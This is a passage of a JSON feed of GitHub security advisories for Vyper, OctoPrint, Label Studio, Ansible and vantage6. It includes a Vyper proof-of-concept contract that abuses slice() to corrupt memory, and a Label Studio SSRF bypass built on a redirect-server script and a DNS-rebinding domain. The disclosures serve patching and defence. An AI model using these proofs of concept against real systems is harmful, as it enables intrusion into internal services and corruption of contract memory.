storage:</p>\n<pre><code>Logs:\n0x0000...00002a\n</code></pre>\n<h2 id=\"poc-length-corruption\">POC: <code>length</code> corruption</h2>\n<p><code>OOG</code> exception doesn't have to be raised - because of the overflow, only a few bytes can be copied, but the <code>length</code> slot is set with the original input value.</p>\n<pre><code class=\"language-python\">d: public(Bytes[256])\n    \n@external\ndef test():\n    x : uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 # 2**256-1\n    self.d = b\"\\x01\\x02\\x03\\x04\\x05\\x06\"\n    # s : Bytes[256] = slice(self.d, 1, x)\n    assert len(slice(self.d, 1, x))==115792089237316195423570985008687907853269984665640564039457584007913129639935\n</code></pre>\n<p>The corruption of <code>length</code> can be then used to read dirty memory:</p>\n<pre><code class=\"language-python\">@external\ndef test():\n    x: uint256 = 115792089237316195423570985008687907853269984665640564039457584007913129639935  # 2**256 - 1\n    y: uint256 = 22704331223003175573249212746801550559464702875615796870481879217237868556850   # 0x3232323232323232323232323232323232323232323232323232323232323232\n    z: uint96 = 1\n    if True:\n        placeholder : uint256[16] = [y, y, y, y, y, y, y, y, y, y, y, y, y, y, y, y]\n    s :String[32] = slice(uint2str(z), 1, x)\t# uint2str(z) == \"1\"\n    #print(len(s))\n    assert slice(s, 1, 2) == \"22\"\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n<p>The built-in <code>slice()</code> method can be used for OOB accesses or the corruption of the <code>length</code> slot.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c\">https://github.com/vyperlang/vyper/security/advisories/GHSA-9x7f-gwxq-6f2c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24561\">https://nvd.nist.gov/vuln/detail/CVE-2024-24561</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/issues/3756\">https://github.com/vyperlang/vyper/issues/3756</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457\">https://github.com/vyperlang/vyper/blob/b01cd686aa567b32498fefd76bd96b0597c6f099/vyper/builtins/functions.py#L404-L457</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9x7f-gwxq-6f2c\">https://github.com/advisories/GHSA-9x7f-gwxq-6f2c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9x7f-gwxq-6f2c",
            "title": "[vyper] Vyper's bounds check on built-in `slice()` function can be overflowed",
            "date_modified": "2024-02-01T20:51:35.000Z",
            "date_published": "2024-02-01T20:51:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9x7f-gwxq-6f2c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>OctoPrint versions up until and including 1.9.3 contain a vulnerability that allows malicious admins to change the password of other admin accounts, including their own, without having to repeat their password.</p>\n<p>An attacker who managed to hijack an admin account might use this to lock out actual admins from their OctoPrint instance.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability will be patched in version 1.10.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>OctoPrint administrators are strongly advised to thoroughly vet who has admin access to their installation.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was discovered and responsibly disclosed to OctoPrint by Timothy \"TK\" Ruppert.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-5626-pw9c-hmjr\">https://github.com/OctoPrint/OctoPrint/security/advisories/GHSA-5626-pw9c-hmjr</a></li>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/commit/1729d167b4ae4a5835bbc7211b92c6828b1c4125\">https://github.com/OctoPrint/OctoPrint/commit/1729d167b4ae4a5835bbc7211b92c6828b1c4125</a></li>\n<li><a href=\"https://github.com/OctoPrint/OctoPrint/releases/tag/1.10.0rc1\">https://github.com/OctoPrint/OctoPrint/releases/tag/1.10.0rc1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23637\">https://nvd.nist.gov/vuln/detail/CVE-2024-23637</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5626-pw9c-hmjr\">https://github.com/advisories/GHSA-5626-pw9c-hmjr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5626-pw9c-hmjr",
            "title": "[OctoPrint] OctoPrint Unverified Password Change via Access Control Settings",
            "date_modified": "2024-01-31T20:25:41.000Z",
            "date_published": "2024-01-31T18:04:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5626-pw9c-hmjr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"introduction\">Introduction</h1>\n<p>This write-up describes a vulnerability found in <a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.11.0\"><code>1.11.0</code></a> and was tested on version <code>1.8.2</code>.</p>\n<h1 id=\"overview\">Overview</h1>\n<p>Label Studio's SSRF protections that can be enabled by setting the <code>SSRF_PROTECTION_ENABLED</code> environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a <a href=\"https://en.wikipedia.org/wiki/DNS_rebinding\">DNS rebinding attack</a>.</p>\n<h1 id=\"description\">Description</h1>\n<p>The following <code>tasks_from_url</code> method in <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155\"><code>label_studio/data_import/uploader.py</code></a> performs the SSRF validation (<code>validate_upload_url</code>) before sending the request.</p>\n<pre><code class=\"language-python\">def tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n</code></pre>\n<p>The <code>validate_upload_url</code> code in <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209\"><code>label_studio/core/utils/io.py</code></a> is shown below.</p>\n<pre><code class=\"language-python\">def validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n</code></pre>\n<p>The issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.</p>\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n<p>Both the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.</p>\n<h3 id=\"http-redirection\">HTTP Redirection</h3>\n<p>The python <code>requests</code> module automatically follows HTTP redirects (eg. response code <code>301</code> and <code>302</code>). Therefore, an attacker could use a URL shortener (eg. <code>https://www.shorturl.at/</code>) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.</p>\n<pre><code class=\"language-python\">from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n</code></pre>\n<h3 id=\"dns-rebinding-attack\">DNS Rebinding Attack</h3>\n<p>DNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain <code>7f000001.030d1fd6.rbndr.us</code> will randomly switch between the IP address <code>3.13.31.214</code> that is not blocked to <code>127.0.0.1</code> which is not allowed.</p>\n<h1 id=\"impact\">Impact</h1>\n<p>SSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.</p>\n<h1 id=\"remediation-advice\">Remediation Advice</h1>\n<ul>\n<li>Before saving any responses, validate the destination IP address is not in the deny list.</li>\n<li>Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.</li>\n</ul>\n<h1 id=\"discovered\">Discovered</h1>\n<ul>\n<li>August 2023, Alex Brown, elttam</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-p59w-9gqw-wj8r\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-p59w-9gqw-wj8r</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/55dd6af4716b92f2bb213fe461d1ffbc380c6a64\">https://github.com/HumanSignal/label-studio/commit/55dd6af4716b92f2bb213fe461d1ffbc380c6a64</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/DNS_rebinding\">https://en.wikipedia.org/wiki/DNS_rebinding</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209\">https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155\">https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.11.0\">https://github.com/HumanSignal/label-studio/releases/tag/1.11.0</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47116\">https://nvd.nist.gov/vuln/detail/CVE-2023-47116</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p59w-9gqw-wj8r\">https://github.com/advisories/GHSA-p59w-9gqw-wj8r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p59w-9gqw-wj8r",
            "title": "[label-studio] Label Studio SSRF on Import Bypassing `SSRF_PROTECTION_ENABLED` Protections",
            "date_modified": "2024-01-31T20:25:34.000Z",
            "date_published": "2024-01-31T18:04:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p59w-9gqw-wj8r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Ansible before 1.5.5 sets 0644 permissions for <code>sources.list</code>, which might allow local users to obtain sensitive credential information in opportunistic circumstances by reading a file that uses the <code>&amp;quot;deb http://user:pass@server:port/&amp;quot;</code> format.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-4659\">https://nvd.nist.gov/vuln/detail/CVE-2014-4659</a></li>\n<li><a href=\"https://github.com/ansible/ansible/blob/release1.5.5/CHANGELOG.md\">https://github.com/ansible/ansible/blob/release1.5.5/CHANGELOG.md</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/a0e027fe362fbc209dbeff2f72d6e95f39885c69\">https://github.com/ansible/ansible/commit/a0e027fe362fbc209dbeff2f72d6e95f39885c69</a></li>\n<li><a href=\"https://web.archive.org/web/20200229060001/https://www.securityfocus.com/bid/68234\">https://web.archive.org/web/20200229060001/https://www.securityfocus.com/bid/68234</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6667-f46p-pg88\">https://github.com/advisories/GHSA-6667-f46p-pg88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6667-f46p-pg88",
            "title": "[ansible] Ansible sets unsafe permissions for sources.list",
            "date_modified": "2024-01-31T00:03:36.000Z",
            "date_published": "2022-05-17T19:57:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6667-f46p-pg88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Ansible before 1.6.7 does not prevent inventory data with \"{{\" and \"lookup\" substrings, and does not prevent remote data with \"{{\" substrings, which allows remote attackers to execute arbitrary code via (1) crafted lookup('pipe') calls or (2) crafted Jinja2 data.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-4966\">https://nvd.nist.gov/vuln/detail/CVE-2014-4966</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527\">https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527</a></li>\n<li><a href=\"http://www.ocert.org/advisories/ocert-2014-004.html\">http://www.ocert.org/advisories/ocert-2014-004.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wqq5-c89p-3wc3\">https://github.com/advisories/GHSA-wqq5-c89p-3wc3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wqq5-c89p-3wc3",
            "title": "[ansible] Ansible Arbitrary Code Execution",
            "date_modified": "2024-01-30T23:56:01.000Z",
            "date_published": "2022-05-17T19:57:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wqq5-c89p-3wc3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Multiple argument injection vulnerabilities in Ansible before 1.6.7 allow remote attackers to execute arbitrary code by leveraging access to an Ansible managed host and providing a crafted fact, as demonstrated by a fact with (1) a trailing \" src=\" clause, (2) a trailing \" temp=\" clause, or (3) a trailing \" validate=\" clause accompanied by a shell command.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-4967\">https://nvd.nist.gov/vuln/detail/CVE-2014-4967</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527\">https://github.com/ansible/ansible/commit/62a1295a3e08cb6c3e9f1b2a1e6e5dcaeab32527</a></li>\n<li><a href=\"http://www.ocert.org/advisories/ocert-2014-004.html\">http://www.ocert.org/advisories/ocert-2014-004.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-64cw-m57j-65xj\">https://github.com/advisories/GHSA-64cw-m57j-65xj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-64cw-m57j-65xj",
            "title": "[ansible] Ansible Arbitrary Code Execution",
            "date_modified": "2024-01-30T23:55:58.000Z",
            "date_published": "2022-05-17T19:57:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-64cw-m57j-65xj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There are no checks on whether the input is encrypted if a task is created in an encrypted collaboration. Therefore, a user may accidentally create a task with sensitive input data that will then be stored unencrypted in a database.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>This is not an issue with the normal workflow, only if e.g. a user with the python client sets encryption to the wrong value.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vantage6/vantage6/security/advisories/GHSA-rjmv-52mp-gjrr\">https://github.com/vantage6/vantage6/security/advisories/GHSA-rjmv-52mp-gjrr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22193\">https://nvd.nist.gov/vuln/detail/CVE-2024-22193</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/commit/6383283733b81abfcacfec7538dc4dc882e98074\">https://github.com/vantage6/vantage6/commit/6383283733b81abfcacfec7538dc4dc882e98074</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rjmv-52mp-gjrr\">https://github.com/advisories/GHSA-rjmv-52mp-gjrr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rjmv-52mp-gjrr",
            "title": "[vantage6] vantage6 may create unencrypted tasks in encrypted collaboration",
            "date_modified": "2024-01-30T20:56:54.000Z",
            "date_published": "2024-01-30T20:56:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rjmv-52mp-gjrr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Nodes and servers get a ssh config by default that permits root login with password authentication. In a proper deployment, the SSH service is not exposed so there is no risk, but not all deployments are ideal. The default should therefore be less permissive.</p>\n<p>We will probably opt to completely remove the ssh option as it is only used for debugging. Later, we can add a debug mode where we can activate it if necessary.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Remove the ssh part from the docker file and build your own docker image</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vantage6/vantage6/security/advisories/GHSA-2wgc-48g2-cj5w\">https://github.com/vantage6/vantage6/security/advisories/GHSA-2wgc-48g2-cj5w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21653\">https://nvd.nist.gov/vuln/detail/CVE-2024-21653</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/commit/3fcc6e6a8bd1142fd7a558d8fdd2b246e55c8841\">https://github.com/vantage6/vantage6/commit/3fcc6e6a8bd1142fd7a558d8fdd2b246e55c8841</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2wgc-48g2-cj5w\">https://github.com/advisories/GHSA-2wgc-48g2-cj5w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2wgc-48g2-cj5w",
            "title": "[vantage6] vantage6 has insecure SSH configuration for node and server containers",
            "date_modified": "2024-01-30T20:56:50.000Z",
            "date_published": "2024-01-30T20:56:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2wgc-48g2-cj5w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>It is possible to find out usernames from the response time of login requests. This could aid attackers in credential attacks</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53\">https://github.com/vantage6/vantage6/security/advisories/GHSA-45gq-q4xh-cp53</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21671\">https://nvd.nist.gov/vuln/detail/CVE-2024-21671</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/commit/389f416c445da4f2438c72f34c3b1084485c4e30\">https://github.com/vantage6/vantage6/commit/389f416c445da4f2438c72f34c3b1084485c4e30</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-45gq-q4xh-cp53\">https://github.com/advisories/GHSA-45gq-q4xh-cp53</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-45gq-q4xh-cp53",
            "title": "[vantage6-server] vantage6 vulnerable to username timing attack",
            "date_modified": "2024-01-30T20:56:50.000Z",
            "date_published": "2024-01-30T20:56:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-45gq-q4xh-cp53"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}